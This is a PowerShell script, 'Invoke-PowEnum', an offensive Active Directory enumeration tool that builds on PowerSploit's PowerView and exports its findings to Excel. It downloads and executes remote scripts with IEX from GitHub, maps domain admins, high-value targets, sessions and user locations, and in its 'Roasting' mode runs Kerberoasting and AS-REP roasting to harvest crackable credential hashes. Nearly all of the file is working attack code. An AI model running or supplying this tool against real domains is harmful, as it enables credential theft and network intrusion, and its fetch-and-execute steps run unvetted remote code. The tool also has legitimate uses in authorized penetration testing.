function Invoke-PowEnum
{
<# 
.SYNOPSIS 
    Quickly enumerate domain info using PowerSploit's PowerView and combine into XLSX
.DESCRIPTION 
    I've been teaching myself PowerShell scripting and this came about.
	Credit goes to contributers of PowerView for making a great tool.
.NOTES 
	Requires Excel to be installed on the systems running this script.
	TODO:
		Add speciality user enum to user xls (http://www.netvision.com/ad_useraccountcontrol.php)
	
.LINK 
	PowerSploit PowerView
	https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
	
	Export to CSV
	https://gist.github.com/gregklee/b01348787af0b47d8b30
.EXAMPLE 
    Invoke-PowEnum -Domain test.com
#>

[CmdletBinding(DefaultParameterSetName="Domain")]
Param(
	[Parameter(Position = 0)]
	[String]
	$Domain,
	
	[Parameter(Position = 1)]
	[ValidateSet('DCOnly', 'Hunting', 'Roasting', 'LargeEnv')]
    [String]
    $Mode = 'DCOnly'
)
	
	
Write-Host "To run from a non-domain joined system:" -ForegroundColor Cyan
Write-Host "runas /netonly /user:DOMAIN\USERNAME powershell.exe"

#Start Stopwatch
$stopwatch = [system.diagnostics.stopwatch]::startnew()

#Download PowerView From GitHub
$webclient = New-Object System.Net.WebClient
$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
Write-Host "Downloading Powerview:" -ForegroundColor Cyan
Write-Host "$url"
IEX $webclient.DownloadString($url)

#Grab Local Domain Using PowerView Function If None Provided
if (!$domain) {$domain = (Get-Domain).Name}
Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan

#Supprese Errors and Warnings
$ErrorActionPreference = 'Continue'
$WarningPreference = "SilentlyContinue"

$script:ExportSheetCount = 1
$script:ExportSheetFileArray = @()


if ($Mode -eq 'DCOnly') {
	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()
	PowEnum-DAs
	PowEnum-EAs
	PowEnum-BltAdmins
	PowEnum-Users
	PowEnum-DCLocalAdmins
	PowEnum-HVTs
	PowEnum-Groups
	PowEnum-ExcelFile -SpreadsheetName DCOnly-UsersAndGroups
	
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()
	PowEnum-DCs
	PowEnum-NetSess
	PowEnum-Computers
	PowEnum-IPs
	PowEnum-Subnets
	PowEnum-DNSRecords
	PowEnum-ExcelFile -SpreadsheetName DCOnly-ComputersAndSessions
}
elseif ($Mode -eq 'Hunting') {
	PowEnum-AdminEnum
	PowEnum-UserHunting
	PowEnum-ExcelFile -SpreadsheetName UserHunting
}
elseif ($Mode -eq 'Roasting') {
	PowEnum-Kerberoast
	PowEnum-ASREPRoast
	PowEnum-ExcelFile -SpreadsheetName Roasting
}
elseif ($Mode -eq 'LargeEnv') {
	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
	PowEnum-DCs
	PowEnum-DAs
	PowEnum-EAs
	PowEnum-BltAdmins
	PowEnum-IPs
	PowEnum-DCLocalAdmins
	PowEnum-Subnets
	PowEnum-DNSRecords
	PowEnum-HVTs
	PowEnum-NetSess
	PowEnum-ExcelFile -SpreadsheetName LargeEnvironment
}
else {
	Write-Host "Incorrect Mode Selected"
	Return
}

$stopwatch.Stop()
Write-Host "Running Time: $($stopwatch.Elapsed.TotalSeconds) seconds"
Write-Host "Exiting..." -ForegroundColor Yellow
}

function PowEnum-DCs {
	Write-Host "[ ]Domain Controllers | " -NoNewLine
	$temp = Get-DomainController -Domain $domain 
	PowEnum-ExportAndCount -TypeEnum DCs
}

function PowEnum-DAs {
	Write-Host "[ ]Domain Admins | " -NoNewLine
	$temp = Get-DomainGroupMember -Identity "Domain Admins" -Domain $domain
	PowEnum-ExportAndCount -TypeEnum DAs
}

function PowEnum-EAs {
	Write-Host "[ ]Enterprise Admins | " -NoNewLine
	$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Domain $domain
	PowEnum-ExportAndCount -TypeEnum EAs
}

function PowEnum-BltAdmins {
	Write-Host "[ ]Builtin Administrators | " -NoNewLine
	$temp = Get-DomainGroupMember -Identity "Administrators" -Domain $domain
	PowEnum-ExportAndCount -TypeEnum BltAdmins
}

function PowEnum-Users {
	Write-Host "[ ]All Domain Users | " -NoNewLine
	$temp = Get-DomainUser -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Users
}

function PowEnum-Groups {
	Write-Host "[ ]All Domain Groups | " -NoNewLine
	$temp = Get-DomainGroup -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Groups
}

function PowEnum-Computers {
	Write-Host "[ ]All Domain Computers | " -NoNewLine
	$temp = Get-NetComputer -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Computers
}

function PowEnum-IPs {
	Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
	$temp = Get-DomainComputer -Domain $domain | Get-IPAddress
	PowEnum-ExportAndCount -TypeEnum IPs
}

function PowEnum-DCLocalAdmins {
	Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
	$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
	PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
}

function PowEnum-Subnets {
	Write-Host "[ ]Domain Subnets | " -NoNewLine
	$temp = Get-DomainSubnet -Domain $domain
	PowEnum-ExportAndCount -TypeEnum Subnets
}

function PowEnum-DNSRecords {
	Write-Host "[ ]DNS Zones & Records | " -NoNewLine
	$temp = Get-DomainDNSZone -Domain $domain | Get-DomainDNSRecord
	PowEnum-ExportAndCount -TypeEnum DNSRecords
}

function PowEnum-HVTs {
	Write-Host "[ ]High Value Targets | " -NoNewLine
	$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember | Select-Object -ExpandProperty MemberName | %{$_ -replace '^[^\\]*\\', ''} | Get-DomainGroupMember -Recurse
	PowEnum-ExportAndCount -TypeEnum HVTs
}

function PowEnum-NetSess {
	try {
		Write-Host "[ ]Net Sessions | " -NoNewLine
		$temp = Get-DomainController -Domain $domain | Get-NetSession
		PowEnum-ExportAndCount -TypeEnum NetSess
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-UserHunting{
	try{
		Write-Host "[ ]User Hunting | " -NoNewLine
		$temp = Find-DomainUserLocation -ShowAll -Domain $domain
		PowEnum-ExportAndCount -TypeEnum UserHunt
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-AdminEnum{
	try{
		Write-Host "[ ]Admin Access Enumeration | " -NoNewLine
		$temp = Find-DomainLocalGroupMember
		PowEnum-ExportAndCount -TypeEnum UserHunt
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-Kerberoast {
	try{
		Write-Host "[ ]Kerberoast | " -NoNewLine
		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $domain -WarningAction silentlyContinue
		PowEnum-ExportAndCount -TypeEnum Kerberoast
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-ASREPRoast {
	try{
		$webclient = New-Object System.Net.WebClient
		$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
		$url = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
		Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
		Write-Host "$url"
		IEX $webclient.DownloadString($url)
		Write-Host "[ ]ASREProast | " -NoNewLine
		$temp = Invoke-ASREPRoast -Domain $domain
		PowEnum-ExportAndCount -TypeEnum ASREPRoast
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-ExportAndCount {
	Param(
		[Parameter(Position = 0)]
		[String]
		$TypeEnum
	)
	if($temp -ne $null){
		
		#Grab the file name and the full path
		$exportfilename = $ExportSheetCount.toString() + '_' + $TypeEnum + '.csv'
		$exportfilepath = (Get-Item -Path ".\" -Verbose).FullName + '\' + $exportfilename
		
		#Perform the actual export
		$temp | Export-CSV -NoTypeInformation -Path ('.\' + $exportfilename)

		#Create new file object and add to array
		$ExportSheetFile = new-object psobject
		$ExportSheetFile | add-member NoteProperty Name $exportfilename
		$ExportSheetFile | add-member NoteProperty FullName $exportfilepath
		$script:ExportSheetFileArray += $ExportSheetFile
	}
	$count = $temp | measure-object | select-object -expandproperty Count
	Write-Host "$count Identified" -ForegroundColor Green
	$script:ExportSheetCount++
}

function PowEnum-ExcelFile
{
	Param(
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$SpreadsheetName
	)
	
	try {
		Write-Host "[ ]Combining CSV Files to XSLX | " -NoNewLine
		
		#Exit if enumeration resulting in nothing
		if($script:ExportSheetFileArray.Count -eq 0){Write-Host "Exiting: No Data Identified" -ForegroundColor Red; Return}
		$path = (Get-Item -Path ".\" -Verbose).FullName
		$XLOutput =  $path + "\" + $env:USERNAME + "_$SpreadsheetName" + "_" + $(get-random) + ".xlsx"

		# Create Excel object (visible), workbook and worksheet
		$Excel = New-Object -ComObject excel.application 
		$Excel.visible = $false
		$Excel.sheetsInNewWorkbook = $script:ExportSheetFileArray.Count
		$workbooks = $excel.Workbooks.Add()
		$CSVSheet = 1

		Foreach ($CSV in $script:ExportSheetFileArray) {

			$worksheets = $workbooks.worksheets
			$CSVFullPath = $CSV.FullName
			
			$SheetName = ($CSV.name -split "\.")[0]
			$worksheet = $worksheets.Item($CSVSheet)
			$worksheet.Name = $SheetName
			
			# Define the connection string and the starting cell for the data
			$TxtConnector = ("TEXT;" + $CSVFullPath)
			$CellRef = $worksheet.Range("A1")

			# Build, use and remove the text file connector
			$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
			$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
			$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
			$worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
			$worksheet.QueryTables.item($Connector.name).delete()

			# Autofit the columns, freeze the top row
			$worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
			$worksheet.Application.ActiveWindow.SplitRow = 1
			$worksheet.Application.ActiveWindow.FreezePanes = $true

			# Set color & border to top header row
			$Selection = $worksheet.cells.Item(1,1).EntireRow
			$Selection.Interior.ColorIndex = 37
			$Selection.BorderAround(1) | Out-Null
			$Selection.Font.Bold=$True
			
			$CSVSheet++
		}

		# Save workbook and close Excel
		$workbooks.SaveAs($XLOutput,51)
		$workbooks.Saved = $true
		$workbooks.Close()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks) | Out-Null
		$Excel.Quit()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
		Write-Host " $CSVSheet Sheeet(s) Processed" -ForegroundColor Green
		[System.GC]::Collect()
		[System.GC]::WaitForPendingFinalizers()
	}catch{Write-Host "Error" -ForegroundColor Red}
}